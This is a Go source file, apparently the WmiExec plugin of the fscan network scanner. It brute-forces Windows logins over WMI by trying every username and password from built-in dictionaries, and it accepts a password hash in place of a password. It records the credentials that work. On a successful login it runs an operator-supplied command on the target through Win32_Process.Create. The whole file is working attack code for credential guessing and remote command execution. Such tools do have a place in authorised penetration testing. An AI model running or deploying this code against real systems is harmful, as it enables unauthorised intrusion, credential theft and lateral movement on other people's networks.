package Plugins

import (
	"fmt"
	"github.com/go-ole/go-ole"
	"github.com/go-ole/go-ole/oleutil"
	"github.com/shadow1ng/fscan/Common"
	"os"
	"strings"
	"time"
)

var (
	ClientHost string
	flag       bool
)

func init() {
	if flag {
		return
	}
	clientHost, err := os.Hostname()
	if err != nil {
		fmt.Println(err)
	}
	ClientHost = clientHost
	flag = true
}

func WmiExec(info *Common.HostInfo) (tmperr error) {
	if Common.DisableBrute {
		return nil
	}

	maxRetries := Common.MaxRetries
	starttime := time.Now().Unix()

	// Traverse all username and password combinations
	for _, user := range Common.Userdict["smb"] {
		for _, pass := range Common.Passwords {
			pass = strings.Replace(pass, "{user}", user, -1)

			// Check for timeout
			if time.Now().Unix()-starttime > int64(Common.Timeout) {
				return fmt.Errorf("scan timeout")
			}

			// Retry loop
			for retryCount := 0; retryCount < maxRetries; retryCount++ {
				// Execute WMI connection
				done := make(chan struct {
					success bool
					err     error
				})

				go func(user, pass string) {
					success, err := Wmiexec(info, user, pass, Common.HashValue)
					done <- struct {
						success bool
						err     error
					}{success, err}
				}(user, pass)

				// Wait for result or timeout
				var err error
				select {
				case result := <-done:
					err = result.err
					if result.success {
						// Successful connection
						var successLog string
						if Common.Domain != "" {
							successLog = fmt.Sprintf("WmiExec %v:%v:%v\\%v ",
								info.Host, info.Ports, Common.Domain, user)
						} else {
							successLog = fmt.Sprintf("WmiExec %v:%v:%v ",
								info.Host, info.Ports, user)
						}

						if Common.HashValue != "" {
							successLog += "hash: " + Common.HashValue
						} else {
							successLog += pass
						}
						Common.LogSuccess(successLog)
						return nil
					}
				case <-time.After(time.Duration(Common.Timeout) * time.Second):
					err = fmt.Errorf("connection timeout")
				}

				// Handle error cases
				if err != nil {
					errlog := fmt.Sprintf("WmiExec %v:%v %v %v %v",
						info.Host, 445, user, pass, err)
					errlog = strings.Replace(errlog, "\n", "", -1)
					Common.LogError(errlog)

					// Check if retry is needed
					if retryErr := Common.CheckErrs(err); retryErr != nil {
						if retryCount == maxRetries-1 {
							return err
						}
						continue // Continue retrying
					}
				}

				break // If no retry is needed, exit retry loop
			}

			// If it's a 32-bit hash value, only try the password once
			if len(Common.HashValue) == 32 {
				break
			}
		}
	}

	return tmperr
}

func Wmiexec(info *Common.HostInfo, user string, pass string, hash string) (flag bool, err error) {
	target := fmt.Sprintf("%s:%v", info.Host, info.Ports)
	return WMIExec(target, user, pass, hash, Common.Domain, Common.Command)
}

func WMIExec(target, username, password, hash, domain, command string) (flag bool, err error) {
	err = ole.CoInitialize(0)
	if err != nil {
		return false, err
	}
	defer ole.CoUninitialize()

	// Build authentication string
	var auth string
	if domain != "" {
		auth = fmt.Sprintf("%s\\%s:%s", domain, username, password)
	} else {
		auth = fmt.Sprintf("%s:%s", username, password)
	}

	// Build WMI connection string
	connectStr := fmt.Sprintf("winmgmts://%s@%s/root/cimv2", auth, target)

	unknown, err := oleutil.CreateObject("WbemScripting.SWbemLocator")
	if err != nil {
		return false, err
	}
	defer unknown.Release()

	wmi, err := unknown.QueryInterface(ole.IID_IDispatch)
	if err != nil {
		return false, err
	}
	defer wmi.Release()

	// Use connectStr to establish connection
	service, err := oleutil.CallMethod(wmi, "ConnectServer", "", connectStr)
	if err != nil {
		return false, err
	}
	defer service.Clear()

	// Connection successful
	flag = true

	// If there is a command, execute it
	if command != "" {
		command = "C:\\Windows\\system32\\cmd.exe /c " + command

		// Create Win32_Process object to execute command
		process, err := oleutil.CallMethod(service.ToIDispatch(), "Get", "Win32_Process")
		if err != nil {
			return flag, err
		}
		defer process.Clear()

		// Execute command
		_, err = oleutil.CallMethod(process.ToIDispatch(), "Create", command)
		if err != nil {
			return flag, err
		}
	}

	return flag, nil
}
